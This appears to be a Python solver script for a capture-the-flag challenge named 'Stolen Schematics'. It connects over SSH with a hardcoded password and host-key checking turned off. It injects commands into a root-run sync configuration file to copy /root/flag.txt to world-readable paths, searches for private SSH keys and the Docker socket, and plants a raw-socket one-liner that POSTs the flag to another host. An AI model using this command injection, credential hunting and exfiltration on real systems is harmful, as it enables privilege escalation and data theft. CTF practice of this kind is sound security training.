#!/usr/bin/env python3
"""Smart solver for Stolen Schematics CTF"""
import subprocess
import time

HOST = "instance.ctf.tdho.st"
PORT = "32971"
PASSWORD = "reyalp"

def ssh_exec(command):
    """Execute command via SSH"""
    cmd = f'sshpass -p "{PASSWORD}" ssh -o StrictHostKeyChecking=no -p {PORT} player@{HOST} "{command}"'
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
        return result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return "[TIMEOUT]"

print("[*] Stolen Schematics - Fast Solve")
print("[*] Setting up flag exfiltration...")

# Method 1: Use wget to POST flag to external server (if available)
output = ssh_exec("which wget curl nc 2>/dev/null")
print(f"[+] Available tools: {output.strip()}")

# Method 2: Write flag via sync-loop to /dev/shm (RAM, fast, world-writable)
print("\n[*] Attempting /dev/shm exfiltration...")
ssh_exec('echo "talldwarf-sync-command=cat /root/flag.txt > /dev/shm/f && chmod 777 /dev/shm/f" > /opt/mc/config/sync-request.conf')
time.sleep(10)
result = ssh_exec("cat /dev/shm/f 2>/dev/null")
if "tdho" in result or "flag" in result:
    print(f"\n[FLAG FOUND]: {result}")
    exit(0)

# Method 3: Try /tmp with different name
print("\n[*] Attempting /tmp exfiltration...")
ssh_exec('echo "talldwarf-sync-command=cp /root/flag.txt /tmp/.x && chmod 777 /tmp/.x" > /opt/mc/config/sync-request.conf')
time.sleep(10)
result = ssh_exec("cat /tmp/.x 2>/dev/null")
if "tdho" in result:
    print(f"\n[FLAG FOUND]: {result}")
    exit(0)

# Method 4: Check if Docker socket is accessible
print("\n[*] Checking for Docker socket...")
result = ssh_exec("ls -la /var/run/docker.sock 2>/dev/null")
print(result)

# Method 5: Enumerate SSH keys for pivot
print("\n[*] Looking for SSH keys...")
result = ssh_exec("find / -name '*.pem' -o -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null | head -5")
print(result)

# Method 6: Check for obvious misconfigurations
print("\n[*] Checking capabilities...")
result = ssh_exec("cat /proc/self/status | grep Cap")
print(result)

# Method 7: Try network exfiltration via DNS or HTTP
print("\n[*] Attempting HTTP POST to host...")
ssh_exec('''echo 'talldwarf-sync-command=FLAG=$(cat /root/flag.txt); python3 -c "import socket; s=socket.socket(); s.connect((\\\"172.27.0.1\\\", 8080)); s.send(b\\\"POST /flag HTTP/1.1\\\\r\\\\nContent-Length: ${#FLAG}\\\\r\\\\n\\\\r\\\\n\\\"); s.send(\\\"$FLAG\\\".encode()); s.close()"' > /opt/mc/config/sync-request.conf''')
time.sleep(10)

# Check management API one more time
print("\n[*] Querying management API...")
result = ssh_exec("python3 -c \"import urllib.request; print(urllib.request.urlopen('http://172.27.0.1:8080/flag').read())\" 2>/dev/null")
print(result)

print("\n[!] All methods exhausted. Manual investigation needed.")
